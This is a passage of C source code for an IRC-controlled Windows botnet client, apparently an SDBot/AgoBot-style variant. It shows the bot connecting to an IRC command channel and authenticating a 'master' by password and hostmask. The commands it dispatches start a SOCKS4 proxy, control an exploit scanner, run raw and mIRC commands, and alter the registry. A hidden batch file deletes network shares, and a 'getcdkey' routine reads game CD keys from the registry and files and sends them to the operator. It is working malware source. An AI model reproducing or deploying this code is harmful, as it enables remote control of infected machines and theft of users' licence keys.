		ssin.sin_addr.s_addr=ResolveAddress(irc.host);
		if (ssin.sin_addr.s_addr==0) return 0;

		memset(nick, 0, sizeof(nick));
		if (irc.spy == 1) {
			nick1 = irc.nick; 
		} else {
			nick1 = rndnick(nick);
			DWORD uptime;
			uptime=GetTickCount();
			if (uptime > 864000000) {	//If uptime is greater than 10 days, mark them out...
				nick1[0]='[';
				nick1[1]='1';
				nick1[2]='0';
				nick1[3]=']';
				if (uptime > 1296000000) {	//15 days
				    nick[0]='[';
				    nick[1]='1';
				    nick[2]='5';
			    	nick[3]=']';
					if (uptime > 1728000000) {
						nick[0]='[';
				        nick[1]='2';
			         	nick[2]='0';
			        	nick[3]=']';
						if (uptime > 2592000000) {
							nick1[0]='[';
							nick1[1]='3';
							nick1[2]='0';
							nick1[3]=']';
						}
					}
				}
			}
		}

		#ifndef NO_IDENT
		CreateThread(NULL, 0, &ident, NULL, 0, &err);
		#endif

		sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		csock[irc.threadnum] = sock;
		err = connect(sock, (LPSOCKADDR)&ssin, sizeof(SOCKADDR_IN));
		if (err == SOCKET_ERROR) {
			closesocket(sock);
			Sleep(2000);
			continue;
		}

		sprintf(str, "Connected to %s", irc.host);

		addlog(str);

		strncpy(cnick[irc.threadnum], nick1, sizeof(cnick[irc.threadnum])-1);

		if (irc.spy == 1) spy = 1; else spy = 0;
		rval = irc_receiveloop(sock, irc.channel, irc.chanpass, nick1, irc.sock, irc.hchan, irc.host, spy);
		closesocket(sock);

		if (rval == 0) continue;
		if (rval == 1) {	//Disconnect (sleep 30 mins, reconnect..)
			Sleep(1800000);
			continue;
		}
		if (rval == 2) break;	//Quit
	}

	threads[irc.threadnum] = 0;
	threadd[irc.threadnum][0] = '\0';
	cnick[irc.threadnum][0] = '\0';
	return rval;
 }

 #ifndef NO_IDENT
// ident server
 DWORD WINAPI ident(LPVOID param)
 {
	SOCKET isock, csock;
	SOCKADDR_IN issin;
	char user[12];
	char buff[500];

	isock = socket(AF_INET, SOCK_STREAM, 0); // set isock to standard TCP socket
	memset(&issin, 0, sizeof(issin));
	issin.sin_addr.s_addr=INADDR_ANY;
	issin.sin_family = AF_INET; // AF_INET is currently the only supported family
	issin.sin_port = htons(113); // set ident port
	bind(isock, (SOCKADDR *)&issin, sizeof(issin)); // bind issin to isock
	listen(isock,5);
	csock=accept(isock,0,0);
	if (csock==INVALID_SOCKET) return 0;
	closesocket(isock);
	if (recv(csock,buff,sizeof(buff),0)==SOCKET_ERROR) return 0;
	Split(buff,0);
	memset(user, 0, sizeof(user));
	rndnick(user);
	strcat(buff," : USERID : UNIX : ");
	strcat(buff,user);
	strcat(buff,"\r\n");
	send(csock,buff,strlen(buff),0);
	// we're done, so let's close our sockets and return
	closesocket(csock);
	return 0;
 }
 #endif

 char * rndnick(char *strbuf)
 {
    int i;

    srand(GetTickCount());
    sprintf(strbuf, "%s", nickconst);
    for (i=1; i<=maxrand; i++) sprintf(strbuf, "%s%i", strbuf, rand()%10);
    return strbuf;
 }

// receive loop for bots/spies
 int irc_receiveloop(SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server, BYTE spy)
 {
	// main receive buffer
	char buff[4096];
	int err, repeat;
	char master[128*maxlogins];
	char str[8];
	char login[64];
	int in_channel=0;

	memset(master, 0, sizeof(master));


	if (serverpass[0] != '\0') {
		sprintf(login, "PASS %s\r\n", serverpass);
		send(sock, login, strlen(login), 0);
	}
	
	//
	//Fixed the nick problem, lol i just used the original - Im just so l33t -  Sentinel
	//
 	sprintf(login, "NICK %s\r\n"
				   "USER %s 0 0 :%s\r\n", nick1, rndnick(str), nick1);
	//
	//
	//
	err = send(sock, login, strlen(login), 0);
	if (err == SOCKET_ERROR) {
		closesocket(sock);
		Sleep(5000);
		return 0;
	}

	// loop forever
	while(1) {
		char host[160];
		char *lines[MAX_LINES];
		int i,j;


		memset(buff, 0, sizeof(buff));
		err = recv(sock, buff, sizeof(buff), 0);
		// if recv() returns 0, that means that the connection has been lost.
		if ((err == 0) || (err == SOCKET_ERROR)) break;

		// split lines up if multiple lines received at once, and parse each line

		
		i=Split(buff,&lines);
		for (j=0;j<i;j++) {
			repeat=1;
			do {
				repeat=irc_parseline(lines[j], sock, channel, chanpass, nick1, server, master, host, &in_channel, repeat);
				repeat--;
			} while (repeat>0);
			if (repeat==-1) return 0;	//Reconnect
			else if (repeat==-2) return 1;	//Disconnect
			else if (repeat==-3) return 2;	//Quit
		}

	}

	return 0;
 }

// function to parse lines for the bot and clones
 int irc_parseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, char *server, char *master, char *host, int *in_channel, int repeat)
 {
	char line1[512];
	char line2[512];
//	char buff[512];
	char *masters[maxlogins];
	BOOL ismaster;
	char ntmp[12];
	char ntmp2[3];
	int i, ii, s;
	char *a[32];
	char a0[128];
	char nick[16];
	char user[24];
	char sendbuf[512];
	unsigned char parmenters[256];
	char msg_real_dest[256];
	DWORD id;
	BOOL silent = FALSE;
	BOOL notice = FALSE;
	BOOL usevars = FALSE;
	int cl;
    
	memset(sendbuf, 0, sizeof(sendbuf));

	id = 0;
	strncpy(nick, nick1, sizeof(nick)-1);
	for (i = 0; i < maxlogins; i++) masters[i] = master + (i * 128);

	if (line == NULL) return 1;
	memset(line1, 0, sizeof(line1));
	strncpy(line1, line, sizeof(line1)-1);
	char *x = strstr(line1, " :");

	// split the line up into seperate words
	strncpy(line2, line1, sizeof(line2)-1);
	a[0] = strtok(line2, " ");
	for (i = 1; i < 32; i++) a[i] = strtok(NULL, " ");

	if (a[0] == NULL || a[1] == NULL) return 1;

   silent=FALSE;   //silent by default :) 
   //check for 'silent' parameter 

   memset(parmenters,0,sizeof(parmenters)); 

   for (i=31;i>=0;i--) { 
      if (!a[i]) continue; 
      if ((a[i][0]=='-') && (a[i][2]==0)) { 
         //Looks like a valid parmenter.. 
         parmenters[a[i][1]]=1; 
         a[i][0]=0; 
         a[i][1]=0; 
         a[i][2]=0; 
         a[i]=NULL; 
      } else break; 
   } 

   if (parmenters['s']) silent=TRUE; 
   if (parmenters['n']) { 
      silent=FALSE; 
      notice=TRUE; 
   }
	if (a[0][0] != '\n') {
		strncpy(a0,  a[0], sizeof(a0)-1);
		strncpy(user, a[0]+1, sizeof(user)-1);
		strtok(user, "!");
	}

	// pong if we get a ping request from the server
	if (strcmp("PING", a[0]) == 0) {
		a[0][1]='O';

		irc_sendf(sock, "PONG %s\r\n", a[1]+1);
		if (*in_channel == 0) {
			irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);
		}
		return 1;
	}

	// looks like we're connected to the server, let's join the channel
	if (strcmp("001", a[1]) == 0 || strcmp("005", a[1]) == 0) {
		irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);
		irc_sendf(sock, "USERHOST %s\r\n", nick1); // get our hostname
		irc_sendf(sock,"MODE %s +i\r\n",nick1);
		success = TRUE;
		return 1;
	}

	// get host
	if (strcmp("302", a[1]) == 0) {
		char *h = strstr(a[3], "@");
		if (h != NULL) strncpy(host,  h+1, 159);
		return 1;
	}

	// nick already in use   - 
	if (strcmp("433", a[1]) == 0) {
		rndnick(nick1);
		irc_sendf(sock, "NICK %s\r\n", nick1);
		return 1;
	}


	// check if user is logged in
	ismaster = FALSE;
	for (i = 0; i < maxlogins; i++) {
		if (strcmp(masters[i], a0) == 0) {
			ismaster = TRUE;
		}
	}

	//rejoin channel if we're kicked, otherwise reset master if it was our master that got kicked
	if (strcmp("KICK", a[1]) == 0) {
		char *knick;
		for (i = 0; i < maxlogins; i++) {
			if (masters[i][0] == '\0') continue;
			strncpy(a0,  masters[i], sizeof(a0)-1);
			knick = user;
			if (knick != NULL && a[3] != NULL) if (strcmp(knick, a[3]) == 0) {
				masters[i][0] = '\0';
				sprintf(sendbuf,"User %s logged out", knick);
				irc_sendf2(sock, "NOTICE %s :%s\r\n", knick, sendbuf);
				addlog(sendbuf);
			}
		}
		if (strcmp(nick1, a[3]) == 0) {
			*in_channel = 0;
			irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);
		}
		return 1;
	}


	if (strcmp("NICK", a[1]) == 0) {
		char *oldnck = user;
		char *newnck = a[2] + 1;
		for (i=0;i<maxlogins;i++) {
			if (strcmp(masters[i],a0)==0) {
				//Master has changed nick
				//Lets TRY to rebuild the master-usermask.
				char *identandhost=strchr(a0,'!');
				if (identandhost) {
					masters[i][0]=':';	//Prefix
					strcpy(&masters[i][1],newnck);
					strcat(&masters[i][2],identandhost);
				}
			}
		}
		if (oldnck != NULL && newnck != NULL)  {
			if (strcmp(oldnck, nick1) == 0) strncpy(nick1,  newnck, 15);
		}
		return 1;
	}

	// reset master if master parts or quits
	if (strcmp("PART", a[1]) == 0 || strcmp("QUIT", a[1]) == 0) for (i = 0; i < maxlogins; i++) if (masters[i][0] != '\0') if (strcmp(masters[i], a[0]) == 0) {
		masters[i][0] = '\0';
		sprintf(sendbuf, "User %s logged out", user);
		addlog(sendbuf);
		if (strcmp("PART", a[1]) == 0) irc_sendf2(sock, "NOTICE %s :%s\r\n", a[0] + 1, sendbuf);
		return 1;
	}

	// we've successfully joined the channel
	if (strcmp("353", a[1]) == 0) {
		if (strcmp(channel, a[4]) == 0) *in_channel = 1;
		sprintf(sendbuf, "Joined channel %s", a[4]);
		addlog(sendbuf);
		return 1;
	}

	// if we get a privmsg, notice or topic command, start parsing it
	if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0 || (strcmp("332", a[1]) == 0 && topiccmd)) {
		if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0) {	// it's a privmsg/notice
			if (strcmp("NOTICE", a[1]) == 0) notice = TRUE;
			if (a[2] == NULL) return 1;
			strcpy(msg_real_dest,a[2]);
			if (strstr(a[2], "#") == NULL || notice) a[2] = user;

			if (a[3] == NULL) return 1;
			a[3]++;
			// if our nick is the first part of the privmsg, then we should look at a[4] for a command, a[3] otherwise.
			if (strncmp(nick, a[3], strlen(nick)) == 0) s = 4; else s = 3;
			if (a[s] == NULL) return 1;
			// if someone asks for our version, send version reply
			if (strcmp("\1VERSION\1", a[s]) == 0) if (a[2][0] != '#' && version[0] != '\0') {
				irc_sendf2(sock, "NOTICE %s :\1VERSION %s\1\r\n", a[2], (char *)versionlist[current_version]);
				return 1;
			}
			else if (strcmp("\1PING", a[s]) == 0) if (a[s+1] != NULL && a[2][0] != '#') {
				irc_sendf2(sock, "NOTICE %s :\1PING %s\1\r\n", a[2], a[s+1]);
				return 1;
			}
		} else  { // it's a topic command
			s = 4;
			a[4]++;
			a[2] = a[3];
		}

		if (a[s]++[0] != prefix1) return 1;
		// see if someone is logging in

if (strcmp("login", a[s]) == 0)
    {
    if (a[s+1] == NULL) return 1;
    if (ismaster || strstr(a[2], "#") == NULL) return 1;

    char *u = strtok(a[0], "!") + 1;
    char *h = strtok(NULL, "\0");

    if (strcmp(password, a[s+1]) != 0)
        {
        irc_sendf(sock, "NOTICE %s :Password incorrect. Loser Youre logged.\r\n", user);
        sprintf(sendbuf, "Fucked login by %s (%s)", u, h);
        addlog(sendbuf);
        return 1;
        }
    if (!HostMaskMatch(h))
        {
        irc_sendf(sock, "NOTICE %s :Hostmask incorrect. Loser youre logged.\r\n", user);
        sprintf(sendbuf, "Failed login by %s (%s)", u, h);
        addlog(sendbuf);
        return 1;
        }
    for(i = 0; i < maxlogins; i++)
        {
        if (a[s+1] == NULL) return 1;
        if (masters[i][0] != '\0') continue;
        if (strcmp(password, a[s+1]) == 0)
            {
            strncpy(masters[i],  a0, 127);
            if (!silent) irc_privmsg(sock, a[2], "0Password accepted [xT].", notice);
            sprintf(sendbuf, "User %s (%s) logged in", u, h);
            addlog(sendbuf);
            break;
            }
        }
    return 1;
    }
		if (ismaster || strcmp("332", a[1]) == 0) {
			// commands requiring no parameters
			// check if the command matches an alias's name
			for (i = 0; i < anum; i++) {
				if (strcmp(aliases[i].name, a[s]) == 0) {
					char *sc = strstr(line, " :");
					if (sc == NULL) return 1;
					sc[2] = prefix1;
					sc[3] = prefix1;
					strncpy(sc+4, aliases[i].command, 159);

					// process '$x-' parameter variables
					for (ii=15; ii > 0; ii--) {
						sprintf(ntmp, "$%d-", ii);
						if (strstr(line, ntmp) != NULL && a[s+ii+1] != NULL) {
							x = x + strlen(aliases[i].name);
							if (x != NULL) {
								char *y = strstr(x, a[s+ii]);
								if (y != NULL) replacestr(line, ntmp, y);
							}
						}
						else if (a[s+ii+1] == NULL) {
							strncpy(ntmp2, ntmp, 2);
							ntmp2[2] = '\0';
							replacestr(line, ntmp, ntmp2);
						}
					}

					// process '$x' parameter variables
					for (ii=16; ii > 0; ii--){
						sprintf(ntmp, "$%d", ii);
						if (strstr(line, ntmp) != NULL && a[s+ii] != NULL) replacestr(line, ntmp, a[s+ii]);
					}

					usevars = TRUE;
					break;
				}
			}

			if (a[s][0] == prefix1 || usevars) {
				// process variables
				replacestr(line, "$me", nick1); // bot's nick
				replacestr(line, "$user", user); // user's nick
				replacestr(line, "$chan", a[2]); // channel name (or user name if this is a privmsg to the bot)
				replacestr(line, "$rndnick", rndnick(ntmp)); // random string of 4-7 characters
				replacestr(line, "$server", server); // name of current server

				// process '$chr()' variables
				while (strstr(line, "$chr(") != NULL) {
					char *c = strstr(line, "$chr(");
					strncpy(ntmp, c+5, 4);
					strtok(ntmp, ")");
					if (ntmp[0] < 48 || ntmp[0] > 57)  strncpy(ntmp, "63", 3);
					if (atoi(ntmp) > 0) ntmp2[0] = atoi(ntmp); else ntmp2[0] = (rand()%96) + 32;
					ntmp2[1] = '\0';
					cl = strlen(ntmp);
					memset(ntmp, 0, sizeof(ntmp));
					strncpy(ntmp, c, cl+6);
					replacestr(line, ntmp, ntmp2);
				}

				// re-split the line into seperate words
				strncpy(line1, line, sizeof(line1)-1);
				strncpy(line2, line1, sizeof(line2)-1);
				a[0] = strtok(line2, " ");
				for (i = 1; i < 32; i++) a[i] = strtok(NULL, " ");
				if (a[s] == NULL) return 1;
				a[s] += 3;
			}

			if (strcmp("rndnick", a[s]) == 0 || strcmp("rn", a[s]) == 0) {
				rndnick(nick);
				irc_sendf(sock, "NICK %s\r\n", nick);
			}
			else if (strcmp("die", a[s]) == 0 || strcmp("d", a[s]) == 0) {
				if (strcmp("332", a[1]) != 0) exit(0);
			}
			else if (strcmp("logout", a[s]) == 0 || strcmp("lo", a[s]) == 0) {
				for (i = 0; i < maxlogins; i++) if (strcmp(masters[i], a[0]) == 0) {
					masters[i][0] = '\0';
					sprintf(sendbuf, "User %s logged out\r\n", user);
					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					addlog(sendbuf);
				}
			}
			#ifndef NO_BOTVERSION
			else if (strcmp("version", a[s]) == 0 || strcmp("ver", a[s]) == 0) {
				sprintf(sendbuf, bversion);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			}
			#endif
			#ifndef NO_SECURE
			else if (strcmp("secure", a[s]) == 0 || strcmp("sec", a[s]) == 0) {
				// by Edge & ex0r, ex0rHACK-v04, enjoy :P~~~
				// Set EnableDCOM to "N" (Gutted from AgoBot >:))
				HKEY hkey=NULL; 
				DWORD dwSize=128; 
				char szDataBuf[128];
				strcpy(szDataBuf, "N"); 
				dwSize=strlen(szDataBuf);
				LONG lRet=RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\OLE", 0, KEY_READ, &hkey);
				RegSetValueEx(hkey, "EnableDCOM", NULL, REG_SZ, (unsigned char*)szDataBuf, dwSize);
				RegCloseKey(hkey);

				HANDLE f;
				DWORD r;
				PROCESS_INFORMATION pinfo;
				STARTUPINFO sinfo;
				char cmdline[256];
				char tcmdline[256];
				char cfilename[256];
				char batfile[256];
				GetTempPath(sizeof(tempdir), tempdir);
				sprintf(batfile, "%s\\secure.bat", tempdir);
				f = CreateFile(batfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
				if (f > (HANDLE)0) {
				// Write a batch file to remove NT Network Shares.
				WriteFile(f, "@echo off\r\n"
								"net share C$ /delete /y\r\n"
								"net share D$ /delete /y\r\n"
								"net share IPC$ /delete /y\r\n"
								"net share ADMIN$ /delete /y\r\n", 115, &r, NULL); // No idea why 115, 105 was creating some funky shit ;x
				CloseHandle(f);

				memset(&sinfo, 0, sizeof(STARTUPINFO));
				sinfo.cb = sizeof(sinfo);
				sinfo.wShowWindow = SW_HIDE;

				GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));// get our file name
				sprintf(tcmdline, "%%comspec%% /c %s %s", batfile, cfilename); // build command line
				ExpandEnvironmentStrings(tcmdline, cmdline, sizeof(cmdline)); // put the name of the command interpreter into the command line

				// Execute the batch file
				CreateProcess(NULL, cmdline, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo);
				}
				if (!silent) {
					irc_privmsg(sock, a[2], "0[xT]Bot secured.", notice);
				}
			}
			#endif
			#ifndef NO_SOCK4SERV
				else if (strcmp("startsocks", a[s]) == 0) {
					CreateThread(NULL, 0, &SocksDaemon, NULL, 0, &id);
					sprintf(sendbuf, "(SOCKS4) Port %d\r\n", sock4port);
					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					addlog(sendbuf);
				}
			#endif
			/* - Ignore this, just some test code I was using.
			else if (strcmp("restrict", a[s]) == 0) {
				HKEY hKey;
				DWORD dwData;
				if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Contol\\Lsa", 0, KEY_ALL_ACCESS, &hKey) != 0) return 1;
				dwData = 0x00000001;
				RegSetValueEx(hKey, "restrictanonymous", 0, REG_DWORD, (LPBYTE) &dwData, sizeof(DWORD));
				RegCloseKey(hKey);
				irc_privmsg(sock, a[2], "Restricted NULL access to the IPC$ Share.", notice);
			}
			#endif
			*/
			else if (strcmp("reconnect", a[s]) == 0 || strcmp("r", a[s]) == 0) {
				irc_send(sock, "QUIT :Reconnecting..");
				return 0;
			}
			else if (strcmp("disconnect", a[s]) == 0 || strcmp("d", a[s]) == 0) {
				irc_send(sock, "QUIT :Client exiting");
				return -1;
			}
			else if (strcmp("quit", a[s]) == 0 || strcmp("q", a[s]) == 0) {
				if (a[s+1] == NULL) irc_send(sock, "QUIT :Client exiting\r\n"); else {
					if (x != NULL) {
						char *y = strstr(x, a[s+1]);
						if (y != NULL) irc_sendf(sock, "QUIT :%s\r\n", y);
					}
				}
				return -2;
			}
			else if (strcmp("mirccmd", a[s]) == 0 || strcmp("mirc", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
                if (y != NULL) mirccmd(y);
                }
			}
			else if (strcmp("status", a[s]) == 0 || strcmp("s", a[s]) == 0) {
				DWORD total, days, hours, minutes;
				total = (GetTickCount() / 1000) - started;
				days = total / 86400;
				hours = (total % 86400) / 3600;
				minutes = ((total % 86400) % 3600) / 60;
				sprintf(sendbuf, "0[xT]Drone ready. (Online for): %dd %dh %dm", days, hours, minutes);
				irc_privmsg(sock, a[2], sendbuf, notice);
			}
			else if (strcmp("id", a[s]) == 0 || strcmp("i", a[s]) == 0) irc_privmsg(sock, a[2], (char *)botid, notice);
			else if (strcmp("threads", a[s]) == 0 || strcmp("t", a[s]) == 0) {
				irc_privmsg(sock, a[2], "(Thread list)", notice);
				for (i = 0; i < 64; i++) {
					if (threadd[i][0] != '\0') {
						sprintf(sendbuf, "%d. %s", i, threadd[i]);
						irc_privmsg(sock, a[2], sendbuf, notice);
					}
				}
			}
			else if (strcmp("aliases", a[s]) == 0 || strcmp("al", a[s]) == 0) {
				irc_privmsg(sock, a[2], "(Alias list)", notice);
				for (i = 0; i < maxaliases; i++) {
					if (aliases[i].name[0] != '\0') {
						sprintf(sendbuf, "%d. %s = %s", i, aliases[i].name, aliases[i].command);
						irc_privmsg(sock, a[2], sendbuf, notice);
					}
				}
			}
			else if (strcmp("log", a[s]) == 0 || strcmp("lg", a[s]) == 0) {
				for (i = 0; i < 128; i++) {
					if (log[i][0] != '\0') {
						irc_privmsg(sock, a[2], log[i], notice);
					}
				}
			}


			#ifndef NO_NETINFO
			else if (strcmp("netinfo", a[s]) == 0 || strcmp("ni", a[s]) == 0) irc_privmsg(sock, a[2], netinfo(sendbuf, host, sock), notice);
			#endif
			#ifndef NO_SYSINFO
			else if (strcmp("sysinfo", a[s]) == 0 || strcmp("si", a[s]) == 0) irc_privmsg(sock, a[2], sysinfo(sendbuf), notice);
			#endif
			else if (strcmp("remove", a[s]) == 0 || strcmp("rm", a[s]) == 0) {
				if (!silent) irc_privmsg(sock, a[2], "Removing bot..", notice);
				uninstall();
				WSACleanup();
				exit(0);
			}
			else if (strcmp("ntstop",a[s])==0) {
				if (!silent) irc_privmsg(sock,a[2],"(xTScan): Stopped.",notice);
				ntscan=FALSE;
				scanning=FALSE;  //scanning equals false scanning can now start
				//
				//
				TerminateThread(threads[1], 0); //KILLS THREAD #1 WHICH SHOULD BE NTSCAN THREAD
						if (threads[1] != 0)
						threads[1] = 0;
						threadd[1][0] = '\0';
						cnick[1][0] = '\0';
						closesocket(csock[1]);
				//
				//
			}
			else if (strcmp("ntdel",a[s])==0) {
				DeleteFile("payload.dat");
				if (!silent) irc_privmsg(sock,a[2],"Removed payload.dat",notice);
			}
			else if (strcmp("ntstats",a[s])==0) {
				if (!silent) {
					DWORD total, days, hours, minutes;
				    total = (GetTickCount() / 1000) - started;
					days = total / 86400;
					hours = (total % 86400) / 3600;
					minutes = ((total % 86400) % 3600) / 60;6400;
					sprintf(sendbuf, "(xTStats): Exploited %d IP(s) in %ddays %dhours %dminutes", sploitstats, days, hours, minutes);
					irc_privmsg(sock, a[2], sendbuf, notice);
				}
			}
			else if (strcmp("getcdkey", a[s]) == 0 || strcmp("cdkey", a[s]) == 0) {
				// Half-Life CDKey
				HKEY hkey = NULL;
				LONG lRet = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Valve\\Half-Life\\Settings", 0, KEY_READ, &hkey);
				DWORD dwSize = 128;
				unsigned char szDataBuf[128];
				if(RegQueryValueEx(hkey, "Key", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS) {
				                sprintf(sendbuf, "Found Half-Life CDKey (%s)\r\n", szDataBuf);
				                irc_privmsg(sock, a[2], sendbuf, notice); }
				RegCloseKey(hkey);
				 
				// UTKEY
				dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Unreal Technology\\Installed Apps\\UT2003", 0, KEY_READ, &hkey);
				if(RegQueryValueEx(hkey, "CDKey", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS) {
				 sprintf(sendbuf, "Found Unreal Tournament 2003 CDKey (%s)\r\n", szDataBuf);
				 irc_privmsg(sock, a[2], sendbuf, notice); }
				RegCloseKey(hkey);
   
				// CSKEY
				dwSize = 128; lRet = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Valve\\CounterStrike\\Settings", 0, KEY_READ, &hkey);
				if(RegQueryValueEx(hkey, "CDKey", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS) {
				 sprintf(sendbuf, "Found Counter-Strike ( Retail ) CDKey (%s)\r\n", szDataBuf);
				 irc_privmsg(sock, a[2], sendbuf, notice); }
				RegCloseKey(hkey);
 
				// IGI2
				dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\IGI 2 Retail", 0, KEY_READ, &hkey);
				if(RegQueryValueEx(hkey, "CDKey", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS) {
				 sprintf(sendbuf, "Found Project IGI 2 CDKey (%s)\r\n", szDataBuf);
				 irc_privmsg(sock, a[2], sendbuf, notice); }
				RegCloseKey(hkey);
 
				// BATTLEFIELD
				dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 1942", 0, KEY_READ, &hkey);
				if(RegQueryValueEx(hkey, "ergc", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS) {
				 sprintf(sendbuf, "Found Battlefield 1942 CDKey (%s)\r\n", szDataBuf);
				 irc_privmsg(sock, a[2], sendbuf, notice); }
				RegCloseKey(hkey);
 
				// BATTLEFIELD ROAD TO ROME
				dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 1942 The Road to Rome", 0, KEY_READ, &hkey);
				if(RegQueryValueEx(hkey, "ergc", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS) {
				 sprintf(sendbuf, "Found Battlefield 1942 Road To Rome CDKey (%s)\r\n", szDataBuf);
				 irc_privmsg(sock, a[2], sendbuf, notice); }
				RegCloseKey(hkey);
 
				// RavenShield
				dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Red Storm Entertainment\\RAVENSHIELD", 0, KEY_READ, &hkey);
				if(RegQueryValueEx(hkey, "CDKey", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS) {
				 sprintf(sendbuf, "Rainbow Six III RavenShield CDKey (%s)\r\n", szDataBuf);
				 irc_privmsg(sock, a[2], sendbuf, notice); }
				RegCloseKey(hkey);
 
				// Neverwinter Nights CDKey

				FILE *fp; char line[100]; dwSize = 128; 
				lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\BioWare\\NWN\\Neverwinter", 0, KEY_READ, &hkey);
				dwSize=1024;
				unsigned char szDataBuf2[1024];
				if(RegQueryValueEx(hkey, "Location", NULL, NULL, szDataBuf2, &dwSize)== ERROR_SUCCESS)
				{ char *szPath = (char*)malloc(1060);
				sprintf(szPath, "%s\\%s", szDataBuf2, "nwncdkey.ini");
	 
				if((fp=fopen(szPath,"r"))!=NULL)
				{ while(fgets(line,100,fp)) {
					if(strstr(line, "Key1="))
					{	strtok(line, "=");
						sprintf(sendbuf, "Found NWN CDKey %s\r\n",strtok(NULL, "="));
						irc_privmsg(sock, a[2], sendbuf, notice); } }
					fclose(fp); }
				if(szPath) free(szPath); }
				RegCloseKey(hkey);
 
				// Soldier of Fortune II
 
				dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Activision\\Soldier of Fortune II - Double Helix", 0, KEY_READ, &hkey);
				if(RegQueryValueEx(hkey, "InstallPath", NULL, NULL, szDataBuf2, &dwSize)== ERROR_SUCCESS)
				{ char *szPath = (char*)malloc(MAX_PATH);
				sprintf(szPath, "%s\\base\\mp\\%s", szDataBuf2, "sof2key");
 
				if((fp=fopen(szPath,"r"))!=NULL)
				{ if(fgets(line, 100, fp))
				  if(!strstr(line, "mtkwftmkemfew3p3b7")) irc_privmsg(sock, a[2],"Found SOF2 CDKey (%s)\r\n", notice);
				 fclose(fp); }
				if(szPath) free(szPath); }
				RegCloseKey(hkey);

	
				// Need For Speed Hot Pursuit 2

				dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA GAMES\\Need For Speed Hot Pursuit 2\\ergc", 0, KEY_READ, &hkey);
				if(RegQueryValueEx(hkey, "", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
				{	sprintf(sendbuf, "Found NFSHP2 CDKey (%s)\r\n", szDataBuf);
				     irc_privmsg(sock, a[2], sendbuf, notice); }
				RegCloseKey(hkey);

				// FIFA 2003

				dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA Sports\\FIFA 2003\\ergc", 0, KEY_READ, &hkey);
				if(RegQueryValueEx(hkey, "", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
				{	sprintf(sendbuf, "Found FIFA 2003 CDKey (%s)\r\n", szDataBuf);
				     irc_privmsg(sock, a[2], sendbuf, notice); }
				RegCloseKey(hkey);

				// Command & Conquer Generals

				dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA GAMES\\Generals\\ergc", 0, KEY_READ, &hkey);
				if(RegQueryValueEx(hkey, "", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
				{	sprintf(sendbuf, "Found Command & Conquer Generals CDKey (%s)\r\n", szDataBuf);
				     irc_privmsg(sock, a[2], sendbuf, notice); }
				RegCloseKey(hkey);

				// Project IGI 2

				dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\IGI 2 Retail\\CDKey", 0, KEY_READ, &hkey);
				if(RegQueryValueEx(hkey, "CDKey", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
				{	sprintf(sendbuf, "Found Project IGI 2 CDKey (%s)\r\n", szDataBuf);
				     irc_privmsg(sock, a[2], sendbuf, notice); }
				RegCloseKey(hkey);

			}


			// commands requiring at least 1 parameter
			else if (a[s+1] == NULL) return 1;

			else if (strcmp("nick", a[s]) == 0 || strcmp("n", a[s]) == 0) {
				irc_sendf(sock, "NICK %s\r\n", a[s+1]);
			}
			else if (strcmp("join", a[s]) == 0 || strcmp("j", a[s]) == 0) {
				irc_sendf2(sock, "JOIN %s %s\r\n", a[s+1], a[s+2]);
			}
			else if (strcmp("part", a[s]) == 0 || strcmp("pt", a[s]) == 0) {
				irc_sendf(sock, "PART %s\r\n", a[s+1]);
			}
			else if (strcmp("raw", a[s]) == 0 || strcmp("r", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) irc_send(sock, y);
				}
			}
